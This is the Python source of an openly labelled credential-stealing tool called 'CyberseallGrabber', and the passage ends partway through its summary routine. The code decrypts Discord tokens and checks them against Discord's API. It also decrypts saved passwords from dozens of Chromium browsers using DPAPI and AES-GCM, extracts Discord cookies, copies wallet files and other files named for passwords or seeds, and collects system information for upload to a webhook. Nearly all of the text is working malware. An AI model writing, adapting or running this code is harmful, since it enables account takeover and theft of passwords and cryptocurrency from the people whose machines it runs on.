import os,re,requests,base64,getpass,sqlite3,shutil,platform,socket,json,zipfile,time,win32crypt,threading,psutil,subprocess
try:from Crypto.Cipher import AES
except:__import__('subprocess').run([__import__('sys').executable,'-m','pip','install','pycryptodome','--quiet'])

class CyberseallGrabber:
    def __init__(self, webhook_url):
        self.w = webhook_url
        self.t = []
        self.vt = []
        self.p = []
        self.f = []
        self.d = os.path.join(os.getenv("APPDATA"), "cyberseall")
        self.keywords = ['password','passwords','wallet','wallets','seed','seeds','private','privatekey','backup','backups','recovery']
        self.setup()
        self.g()
        self.vt = self.validate_tokens()
        self.pw()
        self.fi()
        self.si()
        self.up()
        self.send()
        self.cleanup()

    def setup(self):
        try:
            if not os.path.exists(self.d):
                os.makedirs(self.d)
            self.zf = os.path.join(self.d, "grab_" + str(int(time.time())) + ".zip")
        except:
            pass

    def g(self):
        try:
            def decrypt(buff, master_key):
                try:
                    return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
                except:
                    return "Error"
            
            tokens = []
            cleaned = []
            checker = []
            already_check = []
            
            local = os.getenv('LOCALAPPDATA')
            roaming = os.getenv('APPDATA')
            chrome = local + "\\Google\\Chrome\\User Data"
            
            paths = {
                'Discord': roaming + '\\discord',
                'Discord Canary': roaming + '\\discordcanary',
                'Lightcord': roaming + '\\Lightcord',
                'Discord PTB': roaming + '\\discordptb',
                'Opera': roaming + '\\Opera Software\\Opera Stable',
                'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
                'Amigo': local + '\\Amigo\\User Data',
                'Torch': local + '\\Torch\\User Data',
                'Kometa': local + '\\Kometa\\User Data',
                'Orbitum': local + '\\Orbitum\\User Data',
                'CentBrowser': local + '\\CentBrowser\\User Data',
                '7Star': local + '\\7Star\\7Star\\User Data',
                'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
                'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
                'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
                'Chrome': chrome + '\\Default',
                'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
                'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
                'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
                'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
                'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
                'Iridium': local + '\\Iridium\\User Data\\Default'
            }
            
            for platform, path in paths.items():
                if not os.path.exists(path): 
                    continue
                try:
                    with open(path + f"\\Local State", "r") as file:
                        key = json.loads(file.read())['os_crypt']['encrypted_key']
                        file.close()
                except: 
                    continue
                    
                leveldb_path = path + f"\\Local Storage\\leveldb\\"
                if not os.path.exists(leveldb_path):
                    continue
                    
                for file in os.listdir(leveldb_path):
                    if not file.endswith(".ldb") and not file.endswith(".log"): 
                        continue
                    try:
                        with open(leveldb_path + file, "r", errors='ignore') as files:
                            for x in files.readlines():
                                x.strip()
                                for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                    tokens.append(values)
                    except PermissionError: 
                        continue
                        
                for i in tokens:
                    if i.endswith("\\"):
                        i.replace("\\", "")
                    elif i not in cleaned:
                        cleaned.append(i)
                        
                for token in cleaned:
                    try:
                        tok = decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])
                        if tok != "Error":
                            checker.append(tok)
                    except:
                        continue
                        
                for value in checker:
                    if value not in already_check and len(value) > 50:
                        already_check.append(value)
                        # Validiere Token direkt hier
                        headers = {'Authorization': value, 'Content-Type': 'application/json'}
                        try:
                            res = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
                            if res.status_code == 200:
                                self.t.append(value)
                        except:
                            pass
            
        except:
            pass

    def validate_tokens(self):
        valid_tokens = []
        for token in self.t[:10]:  # Validiere bis zu 10 Token
            try:
                headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
                r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
                if r.status_code == 200:
                    user_data = r.json()
                    
                    # Nitro-Info abrufen
                    has_nitro = False
                    days_left = 0
                    try:
                        nitro_res = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers, timeout=5)
                        if nitro_res.status_code == 200:
                            nitro_data = nitro_res.json()
                            has_nitro = bool(len(nitro_data) > 0)
                            if has_nitro and len(nitro_data) > 0:
                                from datetime import datetime
                                d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                days_left = abs((d2 - d1).days)
                    except:
                        pass
                    
                    token_info = {
                        'token': token,
                        'username': user_data.get('username', 'Unknown'),
                        'discriminator': user_data.get('discriminator', '0000'),
                        'id': user_data.get('id', 'Unknown'),
                        'email': user_data.get('email', 'Hidden'),
                        'phone': user_data.get('phone', 'None'),
                        'verified': user_data.get('verified', False),
                        'mfa_enabled': user_data.get('mfa_enabled', False),
                        'premium_type': user_data.get('premium_type', 0),
                        'has_nitro': has_nitro,
                        'nitro_days_left': days_left
                    }
                    valid_tokens.append(token_info)
            except:
                pass
        return valid_tokens

    def pw(self):
        try:
            # MASSIVE BROWSER-PFADE BASIEREND AUF TESTDATEN
            BROWSER_PATHS = {}
            
            # Alle Chromium-basierten Browser aus testdaten/paths.js
            chromium_browsers = {
                'Google(x86)': 'AppData\\Local\\Google(x86)\\Chrome\\User Data',
                'Google SxS': 'AppData\\Local\\Google\\Chrome SxS\\User Data',
                'Chromium': 'AppData\\Local\\Chromium\\User Data',
                'Thorium': 'AppData\\Local\\Thorium\\User Data',
                'Chrome': 'AppData\\Local\\Google\\Chrome\\User Data',
                'MapleStudio': 'AppData\\Local\\MapleStudio\\ChromePlus\\User Data',
                'Iridium': 'AppData\\Local\\Iridium\\User Data',
                '7Star': 'AppData\\Local\\7Star\\7Star\\User Data',
                'CentBrowser': 'AppData\\Local\\CentBrowser\\User Data',
                'Chedot': 'AppData\\Local\\Chedot\\User Data',
                'Vivaldi': 'AppData\\Local\\Vivaldi\\User Data',
                'Kometa': 'AppData\\Local\\Kometa\\User Data',
                'Elements': 'AppData\\Local\\Elements Browser\\User Data',
                'Epic': 'AppData\\Local\\Epic Privacy Browser\\User Data',
                'uCozMedia': 'AppData\\Local\\uCozMedia\\Uran\\User Data',
                'Fenrir': 'AppData\\Local\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer',
                'Catalina': 'AppData\\Local\\CatalinaGroup\\Citrio\\User Data',
                'Coowon': 'AppData\\Local\\Coowon\\Coowon\\User Data',
                'Liebao': 'AppData\\Local\\liebao\\User Data',
                'QIP Surf': 'AppData\\Local\\QIP Surf\\User Data',
                'Orbitum': 'AppData\\Local\\Orbitum\\User Data',
                'Comodo': 'AppData\\Local\\Comodo\\Dragon\\User Data',
                '360Browser': 'AppData\\Local\\360Browser\\Browser\\User Data',
                'Maxthon3': 'AppData\\Local\\Maxthon3\\User Data',
                'K-Melon': 'AppData\\Local\\K-Melon\\User Data',
                'CocCoc': 'AppData\\Local\\CocCoc\\Browser\\User Data',
                'Amigo': 'AppData\\Local\\Amigo\\User Data',
                'Torch': 'AppData\\Local\\Torch\\User Data',
                'Sputnik': 'AppData\\Local\\Sputnik\\Sputnik\\User Data',
                'Edge': 'AppData\\Local\\Microsoft\\Edge\\User Data',
                'DCBrowser': 'AppData\\Local\\DCBrowser\\User Data',
                'Yandex': 'AppData\\Local\\Yandex\\YandexBrowser\\User Data',
                'UR Browser': 'AppData\\Local\\UR Browser\\User Data',
                'Slimjet': 'AppData\\Local\\Slimjet\\User Data',
                'BraveSoftware': 'AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data',
                'Opera': 'AppData\\Roaming\\Opera Software\\Opera Stable',
                'Opera GX': 'AppData\\Roaming\\Opera Software\\Opera GX Stable',
            }
            
            # Konvertiere Windows-Pfade zu Python-Pfaden und scanne alle Profile
            for browser_name, rel_path in chromium_browsers.items():
                # Konvertiere AppData-Pfad
                if rel_path.startswith('AppData\\Local\\'):
                    base_path = os.path.join(os.getenv("LOCALAPPDATA"), rel_path[15:].replace('\\', os.sep))
                elif rel_path.startswith('AppData\\Roaming\\'):
                    base_path = os.path.join(os.getenv("APPDATA"), rel_path[17:].replace('\\', os.sep))
                else:
                    continue
                
                if not os.path.exists(base_path):
                    continue
                
                # Scanne alle Profile in diesem Browser
                try:
                    for item in os.listdir(base_path):
                        item_path = os.path.join(base_path, item)
                        if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
                            # Bestimme Login-Datei basierend auf Browser
                            if 'Yandex' in browser_name:
                                login_file = "\\Ya Passman Data"
                            else:
                                login_file = "\\Login Data"
                            
                            BROWSER_PATHS[f"{browser_name} ({item})"] = {
                                "profile_path": item_path,
                                "login_db": login_file
                            }
                except:
                    pass
            
            def decrypt_password(password, key):
                try:
                    if not password or len(password) < 3:
                        return "Failed to decrypt"

                    # Methode 1: AES-GCM Entschlüsselung (Chrome 80+)
                    try:
                        if password[:3] == b'v10' or password[:3] == b'v11':
                            iv = password[3:15]
                            encrypted_data = password[15:]
                            cipher = AES.new(key, AES.MODE_GCM, iv)
                            decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
                            if decrypted_pass and len(decrypted_pass) > 0:
                                return decrypted_pass
                    except Exception as e:
                        pass

                    # Methode 2: Direkte AES-GCM ohne Version-Check
                    try:
                        if len(password) >= 15:
                            iv = password[3:15]
                            encrypted_data = password[15:]
                            cipher = AES.new(key, AES.MODE_GCM, iv)
                            decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
                            if decrypted_pass and len(decrypted_pass) > 0:
                                return decrypted_pass
                    except Exception as e:
                        pass

                    # Methode 3: DPAPI Entschlüsselung (Chrome <80)
                    try:
                        result = win32crypt.CryptUnprotectData(password, None, None, None, 0)
                        if result and result[1]:
                            decrypted = result[1].decode('utf-8') if isinstance(result[1], bytes) else str(result[1])
                            if decrypted and len(decrypted) > 0:
                                return decrypted
                    except Exception as e:
                        pass

                    # Methode 4: Alternative AES-GCM mit verschiedenen IV-Längen
                    try:
                        for iv_start in [3, 0, 12]:
                            for iv_len in [12, 16, 8]:
                                if len(password) >= iv_start + iv_len + 16:
                                    iv = password[iv_start:iv_start + iv_len]
                                    encrypted_data = password[iv_start + iv_len:]
                                    cipher = AES.new(key, AES.MODE_GCM, iv)
                                    decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
                                    if decrypted_pass and len(decrypted_pass) > 0:
                                        return decrypted_pass
                    except Exception as e:
                        pass

                    # Methode 5: Rohe Bytes-Analyse für teilweise Wiederherstellung
                    try:
                        if isinstance(password, bytes) and len(password) > 10:
                            printable_chars = ''.join(chr(c) for c in password if 32 <= c <= 126)
                            if len(printable_chars) > 3:
                                return f"Partial: {printable_chars[:50]}"
                    except:
                        pass

                    return "Failed to decrypt"
                except Exception as e:
                    return f"Error: {str(e)[:30]}"
            
            def get_browser_passwords():
                passwords = []
                
                # Erweiterte Browser-Pfade mit mehreren Varianten
                simple_browsers = []
                
                # Chrome - alle möglichen Pfade
                chrome_paths = [
                    os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
                    os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data"),
                    os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data")
                ]
                
                for chrome_base in chrome_paths:
                    if os.path.exists(chrome_base):
                        for profile in ["Default", "Profile 1", "Profile 2"]:
                            profile_path = os.path.join(chrome_base, profile)
                            if os.path.exists(profile_path):
                                simple_browsers.append({
                                    "name": f"Chrome-{profile}",
                                    "path": profile_path,
                                    "base_path": chrome_base,
                                    "login_file": "Login Data"
                                })
                
                # Edge - alle möglichen Pfade
                edge_paths = [
                    os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
                    os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Beta", "User Data"),
                    os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Dev", "User Data")
                ]
                
                for edge_base in edge_paths:
                    if os.path.exists(edge_base):
                        for profile in ["Default", "Profile 1"]:
                            profile_path = os.path.join(edge_base, profile)
                            if os.path.exists(profile_path):
                                simple_browsers.append({
                                    "name": f"Edge-{profile}",
                                    "path": profile_path,
                                    "base_path": edge_base,
                                    "login_file": "Login Data"
                                })
                
                # Brave
                brave_base = os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data")
                if os.path.exists(brave_base):
                    for profile in ["Default", "Profile 1"]:
                        profile_path = os.path.join(brave_base, profile)
                        if os.path.exists(profile_path):
                            simple_browsers.append({
                                "name": f"Brave-{profile}",
                                "path": profile_path,
                                "base_path": brave_base,
                                "login_file": "Login Data"
                            })
                
                # Opera
                opera_base = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable")
                if os.path.exists(opera_base):
                    simple_browsers.append({
                        "name": "Opera",
                        "path": opera_base,
                        "base_path": opera_base,
                        "login_file": "Login Data"
                    })
                
                # Debug: Schreibe welche Browser gefunden wurden
                debug_file = os.path.join(self.d, "debug.txt")
                with open(debug_file, "a", encoding="utf-8") as df:
                    df.write("🔍 SIMPLE BROWSER SCAN:\n")
                    for browser in simple_browsers:
                        exists = os.path.exists(browser["path"])
                        login_exists = os.path.exists(os.path.join(browser["path"], browser["login_file"]))
                        state_exists = os.path.exists(os.path.join(browser["path"], "Local State"))
                        df.write(f"- {browser['name']}: Path={exists}, Login={login_exists}, State={state_exists}\n")
                    df.write("\n")

                for browser_info in simple_browsers:
                    try:
                        browser_name = browser_info["name"]
                        profile_path = browser_info["path"]
                        base_path = browser_info.get("base_path", profile_path)
                        login_file = browser_info["login_file"]
                        
                        # Debug: Versuche Browser zu verarbeiten
                        with open(debug_file, "a", encoding="utf-8") as df:
                            df.write(f"🔄 Processing {browser_name}...\n")
                            df.write(f"   Profile: {profile_path}\n")
                            df.write(f"   Base: {base_path}\n")

                        if not os.path.exists(profile_path):
                            with open(debug_file, "a", encoding="utf-8") as df:
                                df.write(f"❌ {browser_name}: Profile path not found\n")
                            continue

                        login_db_path = os.path.join(profile_path, login_file)
                        if not os.path.exists(login_db_path):
                            with open(debug_file, "a", encoding="utf-8") as df:
                                df.write(f"❌ {browser_name}: Login DB not found at {login_db_path}\n")
                            continue

                        # Suche Local State im base_path (User Data Ordner)
                        state_file = os.path.join(base_path, "Local State")
                        if not os.path.exists(state_file):
                            # Fallback: Suche im profile_path
                            state_file = os.path.join(profile_path, "Local State")
                            if not os.path.exists(state_file):
                                with open(debug_file, "a", encoding="utf-8") as df:
                                    df.write(f"❌ {browser_name}: Local State not found in {base_path} or {profile_path}\n")
                                continue

                        # Hole Master Key
                        try:
                            with open(state_file, "r", encoding="utf-8") as f:
                                local_state = json.loads(f.read())
                                encrypted_key = local_state["os_crypt"]["encrypted_key"]
                                master_key = base64.b64decode(encrypted_key)[5:]
                                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                            
                            with open(debug_file, "a", encoding="utf-8") as df:
                                df.write(f"✅ {browser_name}: Master key extracted\n")
                        except Exception as e:
                            with open(debug_file, "a", encoding="utf-8") as df:
                                df.write(f"❌ {browser_name}: Master key error: {str(e)}\n")
                            continue

                        # Kopiere Login-Datenbank
                        temp_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_login.db")
                        try:
                            if os.path.exists(temp_db):
                                os.remove(temp_db)
                            shutil.copy2(login_db_path, temp_db)
                            
                            with open(debug_file, "a", encoding="utf-8") as df:
                                df.write(f"✅ {browser_name}: Database copied\n")
                        except Exception as e:
                            with open(debug_file, "a", encoding="utf-8") as df:
                                df.write(f"❌ {browser_name}: Database copy error: {str(e)}\n")
                            continue

                        # Extrahiere Passwörter
                        try:
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            
                            # Einfache SQL-Abfrage
                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                            login_data = cursor.fetchall()
                            
                            with open(debug_file, "a", encoding="utf-8") as df:
                                df.write(f"✅ {browser_name}: Found {len(login_data)} login entries\n")

                            success_count = 0
                            for row in login_data:
                                if len(row) >= 3 and row[0] and row[1] and row[2]:
                                    url, username, encrypted_password = row[0], row[1], row[2]
                                    
                                    decrypted_password = None
                                    
                                    # Methode 1: Mit Master Key
                                    try:
                                        decrypted_password = decrypt_password(encrypted_password, master_key)
                                        if decrypted_password and decrypted_password != "Failed to decrypt":
                                            with open(debug_file, "a", encoding="utf-8") as df:
                                                df.write(f"✅ {browser_name}: Decrypted with master key: {url}\n")
                                    except Exception as e:
                                        with open(debug_file, "a", encoding="utf-8") as df:
                                            df.write(f"❌ {browser_name}: Master key decrypt error: {str(e)}\n")
                                    
                                    # Methode 2: Direkte DPAPI-Entschlüsselung (Fallback)
                                    if not decrypted_password or decrypted_password == "Failed to decrypt":
                                        try:
                                            result = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)
                                            if result and result[1]:
                                                decrypted_password = result[1].decode('utf-8') if isinstance(result[1], bytes) else str(result[1])
                                                if decrypted_password and len(decrypted_password) > 0:
                                                    with open(debug_file, "a", encoding="utf-8") as df:
                                                        df.write(f"✅ {browser_name}: Decrypted with DPAPI: {url}\n")
                                        except Exception as e:
                                            with open(debug_file, "a", encoding="utf-8") as df:
                                                df.write(f"❌ {browser_name}: DPAPI decrypt error: {str(e)}\n")
                                    
                                    # Methode 3: Rohe Daten-Analyse (letzter Versuch)
                                    if not decrypted_password or decrypted_password == "Failed to decrypt":
                                        try:
                                            if isinstance(encrypted_password, bytes) and len(encrypted_password) > 10:
                                                # Versuche, lesbare Zeichen zu extrahieren
                                                readable = ''.join(chr(c) for c in encrypted_password if 32 <= c <= 126)
                                                if len(readable) > 3:
                                                    decrypted_password = f"Partial: {readable[:30]}"
                                                    with open(debug_file, "a", encoding="utf-8") as df:
                                                        df.write(f"⚠️ {browser_name}: Partial recovery: {url}\n")
                                        except:
                                            pass
                                    
                                    # Speichere Passwort wenn erfolgreich
                                    if decrypted_password and decrypted_password != "Failed to decrypt":
                                        passwords.append({
                                            "browser": browser_name,
                                            "url": url,
                                            "username": username,
                                            "password": decrypted_password,
                                            "times_used": 0,
                                            "date_created": 0
                                        })
                                        success_count += 1

                            with open(debug_file, "a", encoding="utf-8") as df:
                                df.write(f"✅ {browser_name}: Successfully decrypted {success_count} passwords\n")

                            cursor.close()
                            conn.close()
                            
                            try:
                                os.remove(temp_db)
                            except:
                                pass

                        except Exception as e:
                            with open(debug_file, "a", encoding="utf-8") as df:
                                df.write(f"❌ {browser_name}: SQL error: {str(e)}\n")

                    except Exception as e:
                        with open(debug_file, "a", encoding="utf-8") as df:
                            df.write(f"❌ {browser_name}: General error: {str(e)}\n")

                with open(debug_file, "a", encoding="utf-8") as df:
                    df.write(f"🎯 TOTAL PASSWORDS EXTRACTED: {len(passwords)}\n\n")

                return passwords
            
            # Hole alle Browser-Passwörter
            password_data = get_browser_passwords()
            
            # Vereinfachte Cookie-Extraktion
            def extract_valuable_cookies():
                valuable_cookies = []
                
                # Nur Chrome für erste Tests
                chrome_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default")
                cookies_path = os.path.join(chrome_path, "Cookies")
                
                debug_file = os.path.join(self.d, "debug.txt")
                with open(debug_file, "a", encoding="utf-8") as df:
                    df.write("🍪 COOKIE EXTRACTION:\n")
                    df.write(f"Chrome path exists: {os.path.exists(chrome_path)}\n")
                    df.write(f"Cookies file exists: {os.path.exists(cookies_path)}\n")
                
                if not os.path.exists(cookies_path):
                    with open(debug_file, "a", encoding="utf-8") as df:
                        df.write("❌ No cookies file found\n\n")
                    return valuable_cookies
                
                try:
                    # Hole Master Key
                    state_file = os.path.join(chrome_path, "Local State")
                    if not os.path.exists(state_file):
                        with open(debug_file, "a", encoding="utf-8") as df:
                            df.write("❌ No Local State file\n\n")
                        return valuable_cookies
                    
                    with open(state_file, "r", encoding="utf-8") as f:
                        local_state = json.loads(f.read())
                        encrypted_key = local_state["os_crypt"]["encrypted_key"]
                        master_key = base64.b64decode(encrypted_key)[5:]
                        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                    
                    # Kopiere Cookies-Datenbank
                    temp_cookies_db = os.path.join(os.getenv("TEMP"), "chrome_cookies.db")
                    if os.path.exists(temp_cookies_db):
                        os.remove(temp_cookies_db)
                    
                    shutil.copy2(cookies_path, temp_cookies_db)
                    
                    conn = sqlite3.connect(temp_cookies_db)
                    cursor = conn.cursor()
                    
                    # Suche nach Discord-Cookies als Test
                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%discord.com%' LIMIT 5")
                    cookies = cursor.fetchall()
                    
                    with open(debug_file, "a", encoding="utf-8") as df:
                        df.write(f"Found {len(cookies)} Discord cookies\n")
                    
                    for cookie in cookies:
                        if cookie[2]:  # encrypted_value
                            try:
                                decrypted_value = decrypt_password(cookie[2], master_key)
                                if decrypted_value and decrypted_value != "Failed to decrypt" and len(decrypted_value) > 5:
                                    valuable_cookies.append({
                                        "browser": "Chrome",
                                        "url": f"COOKIE_discord.com",
                                        "username": cookie[1],  # cookie name
                                        "password": decrypted_value[:50],  # Cookie value (gekürzt)
                                        "times_used": 0,
                                        "date_created": 0
                                    })
                            except Exception as e:
                                with open(debug_file, "a", encoding="utf-8") as df:
                                    df.write(f"Cookie decrypt error: {str(e)}\n")
                    
                    cursor.close()
                    conn.close()
                    
                    try:
                        os.remove(temp_cookies_db)
                    except:
                        pass
                    
                    with open(debug_file, "a", encoding="utf-8") as df:
                        df.write(f"✅ Extracted {len(valuable_cookies)} cookies\n\n")
                        
                except Exception as e:
                    with open(debug_file, "a", encoding="utf-8") as df:
                        df.write(f"❌ Cookie extraction error: {str(e)}\n\n")
                
                return valuable_cookies
            
            # Debug-Datei für Fehleranalyse
            debug_file = os.path.join(self.d, "debug.txt")
            with open(debug_file, "w", encoding="utf-8") as df:
                df.write("🔍 CYBERSEALL DEBUG LOG 🔍\n")
                df.write("=" * 50 + "\n\n")
                df.write(f"Gefundene Browser-Pfade: {len(BROWSER_PATHS)}\n")
                for name, data in BROWSER_PATHS.items():
                    df.write(f"- {name}: {data['profile_path']}\n")
                df.write("\n")
            
            # Hole alle Browser-Passwörter und Cookies
            password_data = get_browser_passwords()
            cookie_data = extract_valuable_cookies()
            
            # Debug: Schreibe Ergebnisse
            with open(debug_file, "a", encoding="utf-8") as df:
                df.write(f"Password Data gefunden: {len(password_data)}\n")
                df.write(f"Cookie Data gefunden: {len(cookie_data)}\n")
                for i, pwd in enumerate(password_data[:5]):
                    df.write(f"Password {i+1}: {pwd}\n")
                for i, cookie in enumerate(cookie_data[:5]):
                    df.write(f"Cookie {i+1}: {cookie}\n")
                df.write("\n")
            
            # Kombiniere alle Daten
            all_data = password_data + cookie_data
            
            # Konvertiere zu String-Format für Kompatibilität
            pw_data = []
            for pwd in all_data:
                if pwd.get('times_used', 0) > 0:
                    usage_info = f" | Used: {pwd['times_used']}x"
                else:
                    usage_info = ""
                
                password_entry = f"{pwd['browser']} | {pwd['url']} | {pwd['username']} | {pwd['password']}{usage_info}"
                pw_data.append(password_entry)
            
            # Speichere alle gefundenen Passwörter
            self.p = pw_data
            
            if pw_data:
                try:
                    with open(os.path.join(self.d, "passwords.txt"), "w", encoding="utf-8") as f:
                        f.write("=" * 60 + "\n")
                        f.write("🔥 CYBERSEALL BROWSER PASSWORD STEALER 2025 🔥\n")
                        f.write("=" * 60 + "\n\n")
                        
                        # Gruppiere Passwörter nach Browser
                        browser_groups = {}
                        for password in pw_data:
                            browser = password.split(" |")[0]
                            if browser not in browser_groups:
                                browser_groups[browser] = []
                            browser_groups[browser].append(password)
                        
                        for browser, passwords in browser_groups.items():
                            f.write(f"\n🌐 {browser.upper()} ({len(passwords)} passwords)\n")
                            f.write("-" * 50 + "\n")
                            for password in passwords:
                                f.write(password + "\n")
                            f.write("\n")
                        
                        f.write("=" * 60 + "\n")
                        f.write(f"📊 TOTAL PASSWORDS FOUND: {len(pw_data)}\n")
                        f.write(f"🔍 BROWSERS SCANNED: {len(browser_groups)}\n")
                        f.write("=" * 60 + "\n")
                        
                except Exception as e:
                    pass
            
        except Exception as e:
            pass

    def fi(self):
        try:
            files_data = []
            
            # Nur die wichtigsten Verzeichnisse durchsuchen
            target_dirs = [
                os.path.join(os.getenv("USERPROFILE"), "Desktop"),
                os.path.join(os.getenv("USERPROFILE"), "Documents"),
                os.path.join(os.getenv("USERPROFILE"), "Downloads")
            ]
            
            for d in target_dirs:
                if os.path.exists(d):
                    for r, ds, fs in os.walk(d):
                        for f in fs[:10]:  # Limit auf 10 Dateien pro Verzeichnis
                            if any(keyword in f.lower() for keyword in self.keywords) and f.lower().endswith(('.txt','.key','.wallet','.json','.dat')) and os.path.getsize(os.path.join(r,f)) < 1024*1024:
                                fp = os.path.join(r, f)
                                files_data.append(fp)
                                try:
                                    shutil.copy2(fp, os.path.join(self.d, "file_" + str(len(files_data)) + "_" + f))
                                except:
                                    pass
                                if len(files_data) >= 10:
                                    break
                        if len(files_data) >= 10:
                            break
                    if len(files_data) >= 10:
                        break
            
            # Nur die wichtigsten Crypto-Wallets für bessere Performance
            crypto_paths = [
                os.path.join(os.getenv("APPDATA"), "Exodus"),
                os.path.join(os.getenv("APPDATA"), "atomic"),
                os.path.join(os.getenv("APPDATA"), "Electrum"),
                os.path.join(os.getenv("APPDATA"), "MetaMask"),
                os.path.join(os.getenv("APPDATA"), "Phantom"),
                os.path.join(os.getenv("APPDATA"), "TronLink"),
                os.path.join(os.getenv("APPDATA"), "Binance"),
                os.path.join(os.getenv("LOCALAPPDATA"), "Coinomi")
            ]
            
            for cp in crypto_paths:
                if os.path.exists(cp):
                    for r, ds, fs in os.walk(cp):
                        for f in fs[:5]:  # Limit auf 5 Dateien pro Wallet
                            if f.lower().endswith(('.wallet','.dat','.key','.json')) and os.path.getsize(os.path.join(r,f)) < 5*1024*1024:
                                fp = os.path.join(r, f)
                                files_data.append(fp)
                                try:
                                    shutil.copy2(fp, os.path.join(self.d, "crypto_" + str(len(files_data)) + "_" + f))
                                except:
                                    pass
                                if len(files_data) >= 15:
                                    break
                        if len(files_data) >= 15:
                            break
                    if len(files_data) >= 15:
                        break
            
            self.f = files_data
            with open(os.path.join(self.d, "files.txt"), "w") as f:
                f.write("\n".join(files_data))
        except:
            pass

    def si(self):
        try:
            sys_info = {
                "user": getpass.getuser(),
                "computer": os.getenv("COMPUTERNAME", "Unknown"),
                "platform": platform.platform(),
                "ip": socket.gethostbyname(socket.gethostname()),
                "tokens_found": len(set(self.t)),
                "valid_tokens": len(self.vt),
                "passwords_found": len(self.p),
                "files_found": len(self.f)
            }
            with open(os.path.join(self.d, "system_info.json"), "w") as f:
                json.dump(sys_info, f, indent=2)
            with open(os.path.join(self.d, "valid_tokens.json"), "w") as f:
                json.dump(self.vt, f, indent=2)
        except:
            pass

    def up(self):
        try:
            # Erstelle zusätzliche Zusammenfassungsdateien
            try:
                # Erstelle Browser-Zusammenfassung
                if self.p:
                    with open(os.path.join(self.d, "browser_summary.txt"), "w", encoding="utf-8") as f:
                        f.write("🔥 CYBERSEALL BROWSER DATA SUMMARY 🔥\n")
                        f.write("=" * 60 + "\n\n")
                        
                        # Gruppiere nach Datentyp
                        passwords = [p for p in self.p if not p.startswith("COOKIE_") and not p.startswith("CREDIT_CARD") and not p.startswith("AUTOFILL_DATA")]
                        cookies = [p for p in self.p if p.startswith("COOKIE_")]
                        credit_cards = [p for p in self.p if p.startswith("CREDIT_CARD")]
                        autofill = [p for p in self.p if p.startswith("AUTOFILL_DATA")]
                        
                        f.write(f"📊 STATISTICS:\n")
                        f.write(f"🔑 Browser Passwords: {len(passwords)}\n")
                        f.write(f"🍪 Session Cookies: {len(cookies)}\n")
                        f.write(f"💳 Credit Cards: {len(credit_cards)}\n")
                        f.write(f"📋 Autofill Data: {len(autofill)}\n")
                        f.write(f"📁 Total Entries: {len(self.p)}\n\n")
                        
                        if passwords:
                            f.write("🔑 BROWSER PASSWORDS:\n")
                            f.write("-" * 40 + "\n")
                            for pwd in passwords:
                                f.write(pwd + "\n")
                            f.write("\n")
                        
                        if cookies:
                            f.write("🍪 SESSION COOKIES:\n")
                            f.write("-" * 40 + "\n")
                            for cookie in cookies:
                                f.write(cookie + "\n")
                            f.write("\n")
                        
                        if credit_cards:
                            f.write("💳 CREDIT CARDS:\n")
                            f.write("-" * 40 + "\n")
                            for card in credit_cards:
                                f.write(card + "\n")
                            f.write("\n")
                        
                        if autofill:
                            f.write("📋 AUTOFILL DATA:\n")
                            f.write("-" * 40 + "\n")
                            for auto in autofill:
                                f.write(auto + "\n")
                            f.write("\n")
                
                # Erstelle Token-Zusammenfassung
                if self.vt:
                    with open(os.path.join(self.d, "token_summary.txt"), "w", encoding="utf-8") as f:
                        f.write("🎯 DISCORD TOKEN SUMMARY 🎯\n")
                        f.write("=" * 60 + "\n\n")
                        
                        for i, token_info in enumerate(self.vt):
                            f.write(f"TOKEN #{i+1}:\n")
                            f.write(f"👤 Username: {token_info.get('username', 'Unknown')}#{token_info.get('discriminator', '0000')}\n")
                            f.write(f"📧 Email: {token_info.get('email', 'Hidden')}\n")
                            f.write(f"📱 Phone: {token_info.get('phone', 'None')}\n")
